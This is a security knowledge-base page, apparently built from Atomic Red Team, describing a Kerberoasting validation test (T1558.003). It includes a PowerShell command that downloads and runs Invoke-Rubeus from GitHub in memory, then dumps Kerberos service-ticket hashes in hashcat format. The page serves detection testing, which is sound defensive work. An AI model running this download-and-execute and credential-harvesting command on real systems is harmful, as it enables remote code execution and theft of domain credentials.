---
atomic_guid: "29094950-2c96-4cbd-b5e4-f7c65079678f"
title: "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.003"
attack_technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "29094950-2c96-4cbd-b5e4-f7c65079678f"
  - "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - PowerSharpPack - Kerberoasting Using Rubeus

PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn

## Metadata

- Atomic GUID: 29094950-2c96-4cbd-b5e4-f7c65079678f
- Technique: T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1558.003/T1558.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.003]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml)
